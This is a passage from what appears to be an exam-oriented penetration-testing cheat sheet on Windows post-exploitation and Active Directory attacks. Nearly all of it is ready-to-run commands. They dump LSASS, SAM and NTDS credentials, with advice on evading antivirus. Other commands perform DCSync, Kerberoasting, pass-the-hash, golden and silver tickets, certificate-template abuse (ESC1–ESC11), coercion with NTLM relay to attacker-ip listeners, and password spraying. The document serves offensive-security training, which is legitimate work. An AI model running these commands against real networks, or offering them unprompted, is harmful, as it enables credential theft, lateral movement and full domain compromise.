.\SharpChrome.exe cookies

:: Edge / IE
.\SharpDPAPI.exe vault
```

#### winPEAS / PowerUp — when stuck

```cmd
:: WinPEAS
.\winPEASx64.exe quiet cmd > winpeas.txt
:: Read sections: Privileges → Services → Apps → Files → Network

:: PowerUp
powershell -ep bypass -c ". .\PowerUp.ps1; Invoke-AllChecks"

:: Seatbelt (situational awareness)
.\Seatbelt.exe -group=all

:: SharpUp (PrivescCheck.ps1 alt)
.\SharpUp.exe audit
```

### 6.3 Credential Dumping (Windows)

#### Local SAM (when local admin / SYSTEM)

```cmd
:: Method 1 — reg save (then secretsdump on Linux)
reg save HKLM\SAM C:\Windows\Temp\sam
reg save HKLM\SYSTEM C:\Windows\Temp\sys
reg save HKLM\SECURITY C:\Windows\Temp\sec
:: Pull files via SMB:
:: Method 2 — secretsdump remotely
impacket-secretsdump <dom>/<u>:'<p>'@<ip>
impacket-secretsdump -hashes :<NTLM> <dom>/<u>@<ip>
:: Method 3 — Mimikatz
mimikatz # privilege::debug
mimikatz # token::elevate
mimikatz # lsadump::sam
```

#### LSASS (live creds — if SYSTEM)

```cmd
:: Method A — comsvcs.dll (LOLBin, often bypasses AV)
tasklist /svc | findstr lsass
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <lsass-pid> C:\Windows\Temp\lsass.dmp full

:: Method B — procdump (Sysinternals signed)
procdump.exe -ma lsass.exe lsass.dmp -accepteula

:: Method C — Mimikatz (caught by AV)
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords
mimikatz # sekurlsa::tickets /export

:: Method D — pypykatz (offline parse on Linux)
pypykatz lsa minidump lsass.dmp
```
- **AV bypass ranking**: comsvcs.dll > nanodump > pypykatz on dump > Mimikatz fully unmodified (caught).

#### DCSync (domain — need replication rights)

Prereqs: account with `Replicating Directory Changes` + `Replicating Directory Changes All` (DA, EA, or BloodHound `GetChanges`+`GetChangesAll`).

```bash
impacket-secretsdump <dom>/<user>:'<pass>'@<dc-ip>
impacket-secretsdump -just-dc-user <target> <dom>/<user>:'<pass>'@<dc-ip>
impacket-secretsdump -just-dc-ntlm <dom>/<user>:'<pass>'@<dc-ip>
# With hash:
impacket-secretsdump -hashes :<NTLM> <dom>/<user>@<dc-ip>
# On Windows with Mimikatz:
lsadump::dcsync /domain:<dom> /user:krbtgt
lsadump::dcsync /domain:<dom> /all /csv
```

> 🔄 **LOOP — Domain Admin / DCSync obtained**:
> → Extract krbtgt hash → create Golden Ticket for persistence
> → Dump ALL hashes: `impacket-secretsdump -just-dc-ntlm <dom>/DA@<dc-ip>` → spray on ALL hosts
> → Enumerate trusts: `Get-ADTrust -Filter *` / `nltest /domain_trusts` → cross-domain/forest attacks
> → Check for additional DCs/forests: pivot to each, re-run BloodHound on new domain
> → Pull ntds.dit: diskshadow → robocopy → offline secretsdump (for full offline dump)

#### DPAPI

```cmd
:: 1) Find masterkeys
dir /a %appdata%\Microsoft\Protect\<SID>\
:: 2) Find blobs (Credential Manager / browsers / WiFi keys / RDG)
dir /a %appdata%\Microsoft\Credentials\
dir /a %localappdata%\Microsoft\Credentials\

:: 3) Decrypt — Mimikatz
mimikatz # sekurlsa::dpapi
mimikatz # dpapi::masterkey /in:"<masterkey-file>" /sid:<SID> /password:<user-password>
mimikatz # dpapi::cred /in:"<cred-blob>" /masterkey:<masterkey-hex>
```

```bash
# Or Linux side (after pulling files):
impacket-dpapi masterkey -file <mk> -sid <SID> -password '<pwd>'
impacket-dpapi credential -file <cred-blob> -key <masterkey>
```

> 🔄 **LOOP — Windows SYSTEM/admin obtained**:
> → Dump SAM+SYSTEM+SECURITY hives → `impacket-secretsdump LOCAL` → spray all NTLM hashes
> → `nxc smb <cidr> -u <user> -H <NTLM> --continue-on-success`
> → If domain-joined: dump LSASS → look for DA/privileged domain account tickets in memory
> → Check for sessions: `qwinsta` / BloodHound `HasSession` queries — DA logged in here?
> → Network segmentation: `ipconfig /all` + `arp -a` — new subnets? → §9 pivot setup first
> → Add all new hashes/creds to `~/exam/creds/credentials.txt`

> ✅ **GATE — End of §6 (Windows Post-Ex)**: Must have:
> - [ ] Privesc attempted (token impersonation, SeImpersonatePrivilege, AlwaysInstallElevated, unquoted paths, weak services)
> - [ ] LSASS / SAM / SYSTEM dumped if admin
> - [ ] All creds in `credentials.txt`, sprayed against all known hosts
> - [ ] AD-joined check: domain name, DC IP confirmed

---

## 7. Active Directory

### 7.1 AD Enumeration

#### Unauthenticated

```bash
# DC discovery (DNS)
dig SRV _ldap._tcp.dc._msdcs.<domain> @<dc-ip>
nmap -p53,88,135,139,389,445,464,636,3268 <subnet>

# SMB null
nxc smb <dc-ip> -u '' -p ''
enum4linux-ng -A <dc-ip>
rpcclient -U "" -N <dc-ip>
rpcclient $> enumdomusers
rpcclient $> enumdomgroups
rpcclient $> querydominfo

# LDAP anonymous
ldapsearch -x -H ldap://<dc-ip> -s base namingcontexts
ldapsearch -x -H ldap://<dc-ip> -b "DC=<dom>,DC=<tld>" "(objectClass=user)" sAMAccountName

# Username enumeration via Kerberos
kerbrute userenum --dc <dc-ip> -d <dom> /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -o valid.txt

# AS-REP roastable accounts (no auth needed if usernames known)
impacket-GetNPUsers <dom>/ -no-pass -usersfile valid.txt -dc-ip <dc-ip>
```

#### LLMNR / NBT-NS poisoning (network-level, no creds)

```bash
sudo responder -I tun0 -wd
# Captured NetNTLMv2 → hashcat -m 5600
```

#### Authenticated

- BloodHound — choose collector:
  | Tool | When |
  | --- | --- |
  | `bloodhound-python` (Linux) | You're on Kali, have creds |
  | `SharpHound.exe` | You're on a Windows beachhead box |
  | `SharpHound.ps1` | You can run PowerShell on a beachhead |
  | `rusthound` | bloodhound-python failing on edge cases |

  ```bash
  bloodhound-python -d <dom> -u <user> -p '<pass>' -ns <dc-ip> -c All --zip
  # On Windows
  SharpHound.exe -c All --zipfilename loot.zip
  # Powershell
  Invoke-BloodHound -CollectionMethod All -OutputPrefix loot
  ```
  Import the zip into BloodHound CE; click "Mark all as owned" on your foothold user; run `Find Shortest Paths to Domain Admins`.

- PowerView (Windows beachhead):
  ```powershell
  Import-Module .\PowerView.ps1
  Get-Domain
  Get-DomainController
  Get-DomainPolicy | Select -Expand SystemAccess
  Get-DomainUser
  Get-DomainUser -SPN | select samaccountname,serviceprincipalname
  Get-DomainUser -PreauthNotRequired
  Get-DomainGroup -AdminCount
  Get-DomainGroupMember "Domain Admins"
  Get-DomainComputer -Unconstrained
  Get-DomainObjectAcl -Identity <user> -ResolveGUIDs | ?{ $_.SecurityIdentifier -match "<your-SID>" }
  Find-LocalAdminAccess
  Find-DomainShare -CheckShareAccess
  ```

- net commands (LotL — quietest):
  ```cmd
  net user /domain
  net group "Domain Admins" /domain
  net group "Enterprise Admins" /domain
  net localgroup administrators
  net accounts /domain
  setspn -T <dom> -Q */*               :: SPN listing
  ```

- AD module:
  ```powershell
  Import-Module ActiveDirectory
  Get-ADUser -Filter * -Properties *
  Get-ADUser -LDAPFilter "(servicePrincipalName=*)" -Properties servicePrincipalName
  Get-ADUser -LDAPFilter "(userAccountControl:1.2.840.113556.1.4.803:=4194304)"
  Get-ADComputer -Filter "TrustedForDelegation -eq \$true"
  Get-ADTrust -Filter *
  ```

- nxc / CrackMapExec authenticated:
  ```bash
  nxc smb  <dc-ip> -u <u> -p '<p>' --users --groups --shares --pass-pol --rid-brute
  nxc ldap <dc-ip> -u <u> -p '<p>' --asreproast asrep.hash --kerberoasting kerb.hash --trusted-for-delegation
  nxc smb  <cidr>  -u <u> -p '<p>' --shares
  nxc smb  <cidr>  -u <u> -p '<p>' --gen-relay-list relay.txt
  ```

### 7.2 AD Attack Decision Tree

```
START
  │
  ├── No credentials at all
  │     ├── On the same L2 segment? → Responder (LLMNR/NBT-NS) → NetNTLMv2 → crack or relay
  │     ├── Got usernames? → AS-REP roast (GetNPUsers) → crack
  │     ├── No usernames? → kerbrute userenum → then AS-REP
  │     ├── Found unsigned SMB hosts? → ntlmrelayx -tf relay.txt → wait for auth
  │     └── ADCS web enrollment? → PetitPotam + ntlmrelayx → DC TGT (ESC8)
  │
  ├── Low-priv domain user (or NTLM hash)
  │     ├── Run BloodHound → "Find Shortest Paths to Domain Admins" FIRST
  │     ├── AS-REP Roast FIRST (GetNPUsers -request) → crack → may get new account
  │     ├── Kerberoast (GetUserSPNs) → crack TGS → service account password
  │     ├── Password spray to find reuse:
  │     │     nxc smb <cidr> -u users.txt -p '<found-pass>' --continue-on-success
  │     ├── Read shares: smbmap, snaffler — look for GPP cpassword, scripts, configs
  │     ├── Check for delegation:
  │     │     - Unconstrained → coerce DC to auth → relay TGT
  │     │     - Constrained → S4U2Self/Proxy
  │     │     - RBCD → write msDS-AllowedToActOnBehalfOfOtherIdentity
  │     ├── ACL abuse path from BloodHound → exploit each edge (see 6.3)
  │     └── Shadow Credentials if AddKeyCredentialLink edge present
  │
  ├── Local admin on a machine
  │     ├── secretsdump local SAM → local admin hash → spray (DA reuse?)
  │     ├── Dump LSASS → live domain creds / Kerberos tickets
  │     ├── Find domain admin sessions on this host (qwinsta, BloodHound HasSession)
  │     ├── If DA logged in → token impersonation / sekurlsa::logonpasswords
  │     └── DPAPI vault for stored RDP/web creds
  │
  ├── Domain admin / DA-equivalent
  │     ├── DCSync (secretsdump) → krbtgt hash → Golden Ticket persistence
  │     ├── ntds.dit pull (vssadmin / esentutl) → offline cracking
  │     └── Trust enumeration → cross-domain attacks (SID history / cross-forest)
  │
  └── Stuck
        └── Re-run BloodHound with new owned principals; check shares; run snaffler;
            re-spray reused passwords against more services; re-run kerberoast on
            newly discovered accounts; check certificates (certipy find).
```


#### 7.2.1 Quick AD Attack Ordering Cheat-Sheet

```
1.  nxc smb <dc> -u <u> -p <p>                                  → confirm creds work
2.  nxc smb <dc> -u <u> -p <p> --pass-pol                       → policy (lockout!)
3.  nxc smb <dc> -u <u> -p <p> --users --groups                 → harvest users
4.  nxc ldap <dc> -u <u> -p <p> --asreproast asrep.hash         → AS-REP roastable
5.  nxc ldap <dc> -u <u> -p <p> --kerberoasting kerb.hash       → SPN accounts
6.  hashcat -m 18200 asrep.hash rockyou.txt -r best64.rule      → crack AS-REP
7.  hashcat -m 13100 kerb.hash rockyou.txt -r best64.rule       → crack TGS
8.  bloodhound-python -d <dom> -u <u> -p <p> -ns <dc> -c All    → BloodHound
9.  Mark current user "owned" → check "Outbound Object Control"
10. Spray every cracked password against every host (matrix in §3.3)
11. nxc smb <cidr> -u <u> -p <p> -M spider_plus                 → share secrets
12. nxc ldap <dc> -u <u> -p <p> -M laps                         → LAPS read?
13. nxc ldap <dc> -u <u> -p <p> --gmsa                          → gMSA read?
14. certipy find -u <u>@<dom> -p <p> -dc-ip <dc> -vulnerable    → ADCS misconfigs
15. PetitPotam / printerbug + ntlmrelayx if signing OFF / ADCS web enrollment
16. NoPac (any user → DC) — try last as it's loud
```

---

### 7.3 Specific AD Attack Flows

#### Kerberoasting

```bash
# Linux — need any domain user
impacket-GetUserSPNs <dom>/<user>:'<pass>' -dc-ip <dc-ip> -request -outputfile kerb.hash

# Windows — Rubeus
Rubeus.exe kerberoast /outfile:kerb.hash /nowrap

# Crack
hashcat -m 13100 kerb.hash /usr/share/wordlists/rockyou.txt -r best64.rule
```
- AES-only? `-m 19700` for AES256, `-m 19600` for AES128.
- Targeted (when account doesn't yet have SPN but you have GenericWrite — see ACL section).

#### AS-REP Roasting

```bash
# Without creds (need username list)
impacket-GetNPUsers <dom>/ -no-pass -usersfile users.txt -dc-ip <dc-ip> -format hashcat -outputfile asrep.hash

# With creds — enumerate vulnerable accounts then request
impacket-GetNPUsers <dom>/<user>:'<pass>' -request -dc-ip <dc-ip> -format hashcat -outputfile asrep.hash

# Rubeus
Rubeus.exe asreproast /format:hashcat /outfile:asrep.hash

# Crack
hashcat -m 18200 asrep.hash rockyou.txt -r best64.rule
```

#### Pass-the-Hash (NTLM)

```bash
nxc smb <ip> -u <u> -H <NTLM> -d <dom> --shares
impacket-psexec  <dom>/<u>@<ip>  -hashes :<NTLM>
impacket-wmiexec <dom>/<u>@<ip>  -hashes :<NTLM>
evil-winrm -i <ip> -u <u> -H <NTLM>
xfreerdp /v:<ip> /u:<u> /pth:<NTLM> /d:<dom> /cert:ignore     # needs RestrictedAdmin

# Windows side (Mimikatz)
sekurlsa::pth /user:<u> /domain:<dom> /ntlm:<NTLM> /run:cmd.exe
```
- **Caveat (UAC)**: PtH against local admin accounts is blocked by UAC remote restrictions unless the account is the built-in RID-500 admin OR `LocalAccountTokenFilterPolicy=1`.

#### Pass-the-Ticket / Overpass-the-Hash

```bash
# Linux — request TGT with hash, then use as ccache
impacket-getTGT <dom>/<user> -hashes :<NTLM> -dc-ip <dc-ip>
export KRB5CCNAME=$(pwd)/<user>.ccache
impacket-psexec -k -no-pass <dom>/<user>@<host>.<dom>     # MUST use FQDN
impacket-secretsdump -k -no-pass <dom>/<user>@<host>.<dom>
nxc smb <host>.<dom> --use-kcache

# /etc/krb5.conf must point to your domain & DC; add domain to /etc/hosts pointing to DC IP
```

```cmd
:: Windows — Overpass with Mimikatz
sekurlsa::pth /user:<u> /domain:<dom> /aes256:<aes-key> /run:powershell.exe
:: Or pure PtT
kerberos::ptt <ticket.kirbi>
```

#### Silver Ticket

Need: NTLM hash of the *service account*, target SPN, domain SID.

```bash
# Linux
impacket-ticketer -nthash <svc-NTLM> -domain-sid <SID> -domain <dom> -spn cifs/<host>.<dom> <username>
export KRB5CCNAME=<user>.ccache
impacket-psexec -k -no-pass <dom>/<user>@<host>.<dom>
```
```cmd
:: Windows (Mimikatz)
kerberos::golden /user:Administrator /domain:<dom> /sid:<SID> /target:<host>.<dom> /service:cifs /rc4:<svc-NTLM> /ptt
```

#### Golden Ticket

Need: krbtgt NTLM, domain SID.

```bash
impacket-ticketer -nthash <krbtgt-NTLM> -domain-sid <SID> -domain <dom> Administrator
export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass <dom>/Administrator@<dc-fqdn>
```
```cmd
:: Mimikatz
kerberos::purge
kerberos::golden /user:Administrator /domain:<dom> /sid:<SID> /krbtgt:<krbtgt-NTLM> /ptt
:: Then
misc::cmd
```

#### ACL Abuse

```bash
# Enumerate (BloodHound shows edges)
# In BloodHound, owned user → Right-click → "Outbound Object Control"
# Common edges to weaponise:
```

| Edge / Right | What it allows | Attack tool |
| --- | --- | --- |
| **GenericAll** on user | Reset password OR add SPN OR Shadow Cred | `net rpc password ... -U` / `pywhisker` |
| **GenericWrite** on user | Targeted Kerberoast (set SPN) OR Shadow Cred | targetedKerberoast.py / pywhisker |
| **WriteOwner** on object | Take ownership → grant yourself rights | `Set-DomainObjectOwner`, then `Add-DomainObjectAcl` |
| **WriteDACL** on object | Grant any rights (e.g., DCSync) | `dacledit.py` |
| **ForceChangePassword** | Change target's password (no old pwd) | `net rpc password "<target>" "newP@ss1!" -U "<dom>/<u>%<p>" -S <dc>` |
| **AddMember** on group | Add yourself to group (e.g., DA) | `net rpc group addmem ...`, `bloodyAD add groupMember` |
| **AddKeyCredentialLink** | Shadow Credentials | pywhisker |
| **GenericAll on computer** | RBCD attack OR Shadow Cred | rbcd.py / pywhisker |
| **AllowedToAct** | RBCD already configured — request TGS | impacket-getST -spn cifs/target -impersonate Administrator |

Examples:
```bash
# Force change password
impacket-changepasswd <dom>/<u>:'<oldpass>'@<dc-ip> -newpass 'NewP@ssw0rd!' -altuser <target>
# Or
net rpc password "<target>" "NewP@ssw0rd!" -U "<dom>\\<u>%<p>" -S <dc-ip>

# Add user to group
bloodyAD --host <dc> -d <dom> -u <u> -p '<p>' add groupMember "Domain Admins" <u>

# Targeted Kerberoast (GenericWrite on user)
targetedKerberoast.py -d <dom> -u <u> -p '<p>'

# Add DCSync rights via WriteDACL on domain root
impacket-dacledit -action 'write' -rights 'DCSync' -principal <u> -target-dn 'DC=<d>,DC=<t>' <dom>/<u>:'<p>' -dc-ip <dc-ip>
# Then secretsdump

# RBCD (you have GenericAll/GenericWrite on a computer object)
impacket-getST -spn cifs/target.<dom> -impersonate Administrator <dom>/<computer>$ -hashes :<NTLM>
# Or via rbcd.py:
impacket-rbcd -delegate-from <attacker-machine>$ -delegate-to <victim-machine>$ -action write '<dom>/<u>:<p>'
```

#### Shadow Credentials (msDS-KeyCredentialLink)

Prereq: `GenericAll` / `GenericWrite` / `AddKeyCredentialLink` on target.

```bash
# Linux
pywhisker --dc-ip <dc-ip> -d <dom> -u <u> -p '<p>' --target <victim> --action add
# → outputs <random>.pfx + password

# Get TGT with the cert (PKINIT)
git clone https://github.com/dirkjanm/PKINITtools && cd PKINITtools && pip3 install -r requirements.txt
python3 gettgtpkinit.py -cert-pfx <random>.pfx -pfx-pass '<pfx-pass>' -dc-ip <dc-ip> '<dom>/<victim>' /tmp/<victim>.ccache

# Use TGT to dump NT hash with U2U (UnPAC the hash)
export KRB5CCNAME=/tmp/<victim>.ccache
python3 getnthash.py -key <as-rep-key-from-prev> <dom>/<victim>
# Now you have the NT hash of the victim.

# Or with certipy (single-shot)
certipy shadow auto -username <u>@<dom> -p '<p>' -account <victim>
```

#### ADCS — ESC1

Prereqs (any of):
- A vulnerable cert template you can enroll in (`Enrollee Supplies Subject = TRUE`, allows authentication EKU, low-priv enroll right).

```bash
# Find vulnerable templates
certipy find -u <u>@<dom> -p '<p>' -dc-ip <dc-ip> -vulnerable -stdout

# ESC1 — request a cert with arbitrary UPN
certipy req -u <u>@<dom> -p '<p>' -dc-ip <dc-ip> -ca <CA-name> -template <vuln-template> -upn administrator@<dom> -out admin

# Auth as admin with cert
certipy auth -pfx admin.pfx -dc-ip <dc-ip>
# → outputs NT hash of administrator
```

#### ADCS — ESC8 (NTLM relay to web enrollment)

Prereqs: ADCS web enrollment (`/certsrv`) reachable + DC NTLM auth coerce-able + you can listen.

```bash
# 1) Listener
sudo impacket-ntlmrelayx -t http://<ca-host>/certsrv/certfnsh.asp --adcs -smb2support --template DomainController

# 2) Coerce DC to auth (PetitPotam without creds, or with creds for unpatched)
python3 PetitPotam.py <attacker-ip> <dc-ip>
# Or printerbug (use krbrelayx repo: github.com/dirkjanm/krbrelayx):
python3 printerbug.py <dom>/<u>:'<p>'@<dc-ip> <attacker-ip>

# 3) Relay produces a base64 cert blob → request TGT
python3 gettgtpkinit.py <dom>/<dc-host>$ -pfx-base64 <blob> dc.ccache
export KRB5CCNAME=$(pwd)/dc.ccache

# 4) DCSync as DC$
impacket-secretsdump -k -no-pass -just-dc-ntlm <dom>/<dc-host>$@<dc-fqdn>
```

#### ADCS — ESC2 (Any Purpose EKU)

Prereqs: Template has `Any Purpose` EKU (or no EKU) + low-priv enroll right.

```bash
certipy find -u <u>@<dom> -p '<p>' -dc-ip <dc-ip> -vulnerable -stdout
# Look for: [!] Vulnerabilities: ESC2
certipy req -u <u>@<dom> -p '<p>' -dc-ip <dc-ip> -ca <CA> -template <vuln-template> -upn administrator@<dom> -out admin
certipy auth -pfx admin.pfx -dc-ip <dc-ip>
```

#### ADCS — ESC3 (Certificate Request Agent)

Prereqs: Template has `Certificate Request Agent` EKU + you can enroll + a second template allows enrollment on behalf of another user.

```bash
# Step 1: Request agent cert
certipy req -u <u>@<dom> -p '<p>' -dc-ip <dc-ip> -ca <CA> -template <agent-template> -out agent
# Step 2: Use agent cert to request on behalf of DA
certipy req -u <u>@<dom> -p '<p>' -dc-ip <dc-ip> -ca <CA> -template <enroll-on-behalf-template> -on-behalf-of <dom>\\administrator -pfx agent.pfx -out admin
certipy auth -pfx admin.pfx -dc-ip <dc-ip>
```

#### ADCS — ESC4 (Vulnerable Template ACL)

Prereqs: Write access (GenericWrite/WriteDacl) on the certificate template object.

```bash
# Reconfigure template to become ESC1:
certipy template -u <u>@<dom> -p '<p>' -dc-ip <dc-ip> -template <vuln-template> -save-old
# Then exploit as ESC1:
certipy req -u <u>@<dom> -p '<p>' -dc-ip <dc-ip> -ca <CA> -template <vuln-template> -upn administrator@<dom> -out admin
certipy auth -pfx admin.pfx -dc-ip <dc-ip>
# Restore template after:
certipy template -u <u>@<dom> -p '<p>' -dc-ip <dc-ip> -template <vuln-template> -configuration <template-name>.json
```

#### ADCS — ESC5 (Vulnerable PKI Object ACL)

Prereqs: Write rights on the CA server computer object or CA configuration container in AD.

```bash
# If you have write on CA host computer account → shadow credentials or RBCD → ESC8 → DCSync
# Or: write to CA's Configuration container → modify CA settings
certipy find -u <u>@<dom> -p '<p>' -dc-ip <dc-ip> -vulnerable -stdout
# Look for: [!] Vulnerabilities: ESC5
```

#### ADCS — ESC6 (EDITF_ATTRIBUTESUBJECTALTNAME2)

Prereqs: CA has `EDITF_ATTRIBUTESUBJECTALTNAME2` flag set — any template becomes ESC1.

```bash
# Check:
certipy find -u <u>@<dom> -p '<p>' -dc-ip <dc-ip> -vulnerable -stdout
# Look for: [!] Vulnerabilities: ESC6
# Exploit any enrollable template with -upn:
certipy req -u <u>@<dom> -p '<p>' -dc-ip <dc-ip> -ca <CA> -template User -upn administrator@<dom> -out admin
certipy auth -pfx admin.pfx -dc-ip <dc-ip>
```

#### ADCS — ESC7 (Vulnerable CA ACL)

Prereqs: `Manage CA` or `Manage Certificates` rights on the CA.

```bash
# With Manage Certificates: approve pending cert requests / issue any cert
certipy ca -u <u>@<dom> -p '<p>' -dc-ip <dc-ip> -ca <CA> -add-officer <u>   # grant self officer rights
certipy ca -u <u>@<dom> -p '<p>' -dc-ip <dc-ip> -ca <CA> -enable-template SubCA
certipy req -u <u>@<dom> -p '<p>' -dc-ip <dc-ip> -ca <CA> -template SubCA -upn administrator@<dom> -out admin
# If denied, issue it as CA manager:
certipy ca -u <u>@<dom> -p '<p>' -dc-ip <dc-ip> -ca <CA> -issue-request <request-id>
certipy req -u <u>@<dom> -p '<p>' -dc-ip <dc-ip> -ca <CA> -retrieve <request-id> -out admin
certipy auth -pfx admin.pfx -dc-ip <dc-ip>
```

#### ADCS — ESC9 (No Security Extension on Certificate)

Prereqs: `CT_FLAG_NO_SECURITY_EXTENSION` on template + write access to target's `userPrincipalName` (GenericWrite).

```bash
# Modify victim's UPN to match DA:
certipy account -u <u>@<dom> -p '<p>' -dc-ip <dc-ip> -user <victim> -upn administrator
certipy req -u <victim>@<dom> -p '<p>' -dc-ip <dc-ip> -ca <CA> -template <vuln-template> -out admin
# Restore UPN:
certipy account -u <u>@<dom> -p '<p>' -dc-ip <dc-ip> -user <victim> -upn <victim>@<dom>
certipy auth -pfx admin.pfx -dc-ip <dc-ip>
```

#### ADCS — ESC10 (Weak Certificate Mappings)

Prereqs: `StrongCertificateBindingEnforcement` = 0 or 1 (not 2) on DC. GenericWrite on victim.

```bash
# Same technique as ESC9 — UPN spoofing works because cert mapping is weak
certipy account -u <u>@<dom> -p '<p>' -dc-ip <dc-ip> -user <victim> -upn administrator@<dom>
certipy req -u <victim>@<dom> -p '<p>' -dc-ip <dc-ip> -ca <CA> -template <template> -out admin
certipy account -u <u>@<dom> -p '<p>' -dc-ip <dc-ip> -user <victim> -upn <original-upn>
certipy auth -pfx admin.pfx -dc-ip <dc-ip>
# Check registry key on DC: HKLM\SYSTEM\CurrentControlSet\Services\Kdc\StrongCertificateBindingEnforcement
```

#### ADCS — ESC11 (IF_ENFORCEENCRYPTICERTREQUEST Disabled)

Prereqs: CA has `IF_ENFORCEENCRYPTICERTREQUEST` flag cleared → allows NTLM relay to ICPR (cert enrollment RPC) without encryption.

```bash
# Same as ESC8 but relay to RPC instead of HTTP:
sudo impacket-ntlmrelayx -t rpc://<ca-host> --adcs --template DomainController
# Coerce DC auth → get DC cert → DCSync
```

**Reading `certipy find` output:**
```
[!] Vulnerabilities:
  ESC1  — Enrollee Supplies Subject + auth EKU + low-priv enroll
  ESC2  — Any Purpose EKU
  ESC3  — Certificate Request Agent EKU
  ESC4  — Write access on template object
  ESC6  — CA has EDITF_ATTRIBUTESUBJECTALTNAME2
  ESC8  — HTTP enrollment enabled + NTLM auth possible
# Always run: certipy find -u <u>@<dom> -p '<p>' -dc-ip <dc-ip> -vulnerable -stdout
# Look for [!] lines — each is an exploitable path
# Note: certipy v4+ uses short flags (-u, -p). Older certipy forks used -username / -password.
# Verify installed version: certipy version
```

#### Coercion Methods (Authentication Triggers)

Use to force a target (usually DC) to authenticate to your listener. Chain with ntlmrelayx, Responder, or gettgtpkinit.

| Method | RPC Pipe | Prereq | Tool |
|--------|----------|--------|------|
| MS-RPRN PrinterBug | `\pipe\spoolss` | Spooler svc running, any domain user | `printerbug.py` |
| MS-EFSRPC PetitPotam | `\pipe\efsrpc` (or `\pipe\lsarpc`) | Unpatched: none; patched: needs creds | `PetitPotam.py` |
| MS-DFSNM DFSCoerce | `\pipe\netdfs` | DFS Namespace svc running | `dfscoerce.py` |
| MS-FSRVP ShadowCoerce | `\pipe\FssagentRpc` | File Server VSS Agent installed | `shadowcoerce.py` |
| All-in-one | multiple | any domain user | `coercer` |

```bash
# All-in-one scanner:
coercer scan -u '<u>' -p '<p>' -d <dom> -t <target-ip> -l <attacker-ip>
# All-in-one coerce:
coercer coerce -u '<u>' -p '<p>' -d <dom> -t <target-ip> -l <attacker-ip>

# Individual tools:
python3 printerbug.py <dom>/<u>:'<p>'@<dc-ip> <attacker-ip>              # MS-RPRN
python3 PetitPotam.py -u '<u>' -p '<p>' -d <dom> <attacker-ip> <dc-ip>   # MS-EFSRPC
python3 dfscoerce.py -u '<u>' -p '<p>' -d <dom> <attacker-ip> <dc-ip>    # MS-DFSNM
```

**Chain into relay attacks:**
```bash
# SMB → LDAP (add to group / RBCD):
sudo impacket-ntlmrelayx -t ldaps://<dc> --escalate-user <attacker-user> -smb2support

# SMB → ADCS ESC8 (get DC cert):
sudo impacket-ntlmrelayx -t http://<ca>/certsrv/certfnsh.asp --adcs --template DomainController -smb2support

# SMB → SMB (exec on unsigned target):
sudo impacket-ntlmrelayx -tf relay.txt -smb2support -c "net localgroup administrators <u> /add"
```

#### LDAP signing / SMB relay

```bash
# Step 1: Find unsigned SMB targets
nxc smb <cidr> --gen-relay-list relay.txt

# Step 2: Start relay listener (NOT Responder — they conflict)
sudo impacket-ntlmrelayx -tf relay.txt -smb2support -socks

# Step 3: Trigger authentication (choose one):
#   Option A — Responder for passive poisoning (different terminal):
sudo responder -I tun0 -wd -v
#   Option B — Active coerce with PetitPotam:
python3 PetitPotam.py <attacker-ip> <victim-ip>
#   Option C — PrinterBug:
python3 printerbug.py <dom>/<u>:'<p>'@<victim-ip> <attacker-ip>

# Step 4: Use established SOCKS session:
proxychains4 -q impacket-secretsdump <dom>/<u>@<target>

# Relay → LDAP (write LDAP attribute, e.g., add to a group, RBCD)
sudo impacket-ntlmrelayx -t ldaps://<dc> --escalate-user <attacker-user>
sudo impacket-ntlmrelayx -t ldaps://<dc> --delegate-access --escalate-user <attacker-machine>$
```

#### LLMNR / NBT-NS Poisoning — Windows beachhead (Inveigh)

When you're on a Windows host inside the segment and Linux Responder isn't an option:
```powershell
# C# Inveigh (newer, replaces PowerShell Inveigh)
.\Inveigh.exe                          # default: LLMNR + NBNS + mDNS spoof
.\Inveigh.exe -SpooferIP <attacker> -ConsoleOutput Y -FileOutput Y
# Inside REPL:
GET NTLMV2                             # show captured NetNTLMv2
GET CLEARTEXT                          # captured cleartext
STOP                                   # stop modules
```
Captured hashes → `hashcat -m 5600`.

#### Password Policy Enumeration (do this BEFORE spraying)

```bash
# Linux
nxc smb <dc-ip> -u <u> -p '<p>' --pass-pol
rpcclient -U "<u>%<p>" -c "getdompwinfo" <dc-ip>
ldapsearch -h <dc-ip> -x -b "DC=<d>,DC=<t>" -s sub "* userPassword" | grep -iE "lockout|maxPwdAge|minPwdLength"
enum4linux-ng -A -u '<u>' -p '<p>' <dc-ip>

# Windows (already in domain context)
net accounts /domain                                                         # quick view
Get-DomainPolicy | Select-Object -Expand SystemAccess                        # PowerView
```
- Note `LockoutThreshold` (e.g., 5) and `LockoutObservationWindow` (e.g., 30 min). Sub-threshold spray = 1 try per 30+1 min.

#### Password Spraying — Linux

```bash
# Build user list
nxc smb <dc-ip> -u '<u>' -p '<p>' --users | awk '{print $5}' > users.txt
# Spray (one password against all users)
nxc smb <dc-ip> -u users.txt -p 'Welcome1' --continue-on-success | grep '\[+\]'
# Lock-out-safe spray with kerbrute (no SMB lockout counter increment in some envs)
kerbrute passwordspray -d <dom> --dc <dc-ip> users.txt 'Welcome1'
# Spray local admin re-use (very common!)
nxc smb <cidr> -u administrator -p 'L0calAdmin!' --local-auth
```

#### Password Spraying — Windows (DomainPasswordSpray.ps1)

```powershell
Import-Module .\DomainPasswordSpray.ps1
Invoke-DomainPasswordSpray -Password 'Welcome1' -OutFile spray.txt -Quiet
Invoke-DomainPasswordSpray -UserList users.txt -Password 'Welcome1'
# It auto-removes accounts close to lockout.
```

#### Enumerating Security Controls (do this on first compromised Windows host)

```powershell
# AV / Defender
Get-MpComputerStatus | select AMServiceEnabled,AntivirusEnabled,RealTimeProtectionEnabled,IoavProtectionEnabled
sc query windefend

# AppLocker policy
Get-AppLockerPolicy -Effective | Select -ExpandProperty RuleCollections
# Constrained Language Mode? (huge — limits PowerShell)
$ExecutionContext.SessionState.LanguageMode
# Bypass via downgrade to PowerShell v2 (if available):
powershell -Version 2

# LAPS deployed?
Get-DomainComputer | Where-Object { $_."ms-Mcs-AdmPwd" } | Select dnshostname,'ms-Mcs-AdmPwd'
# Or via LAPSToolkit
Find-LAPSDelegatedGroups
Find-AdmPwdExtendedRights
Get-LAPSComputers
```

#### LAPS (ms-Mcs-AdmPwd) — read the local admin password

Prereq: your account / a group you're in is in the LAPS read delegation.
```bash
# Linux
nxc ldap <dc-ip> -u '<u>' -p '<p>' -M laps
